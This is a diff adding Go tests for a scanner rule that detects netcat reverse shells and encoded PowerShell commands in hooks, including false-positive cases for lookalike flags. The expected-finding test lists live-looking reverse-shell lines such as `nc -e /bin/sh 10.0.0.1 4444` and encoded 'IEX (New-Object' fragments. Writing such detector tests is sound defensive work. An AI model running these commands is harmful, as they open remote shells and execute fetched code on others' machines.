@@ -114,3 +114,32 @@ func TestCFG008_PowerShellReverseShell(t *testing.T) {
 		}
 	}
 }
+
+// `jq -nc` is not netcat, and a long word after `plutil -extract` is not a
+// PowerShell encoded command (#1356).
+func TestCFG008_LookalikeFlags_NoFinding(t *testing.T) {
+	for _, cmd := range []string{
+		`jq -nc --arg url "$url" '{a: $url, status: "missing"}'`,
+		`version="$(plutil -extract CFBundleShortVersionString raw "$fw/Info.plist")"`,
+		`func -nc --list-everything-here`,
+	} {
+		if f := CFG008.Check(hookTarget(t, cmd)); len(f) != 0 {
+			t.Errorf("%s: expected no finding, got %v", cmd, f)
+		}
+	}
+}
+
+func TestCFG008_AnchoredForms_Reported(t *testing.T) {
+	for _, cmd := range []string{
+		`nc -e /bin/sh 10.0.0.1 4444`,
+		`true; ncat -lvp 4444`,
+		`netcat -l 4444`,
+		`(nc 10.0.0.1 4444 -e /bin/sh)`,
+		`powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA`,
+		`pwsh.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0A`,
+	} {
+		if f := CFG008.Check(hookTarget(t, cmd)); len(f) != 1 {
+			t.Errorf("%s: expected 1 finding, got %d", cmd, len(f))
+		}
+	}
+}
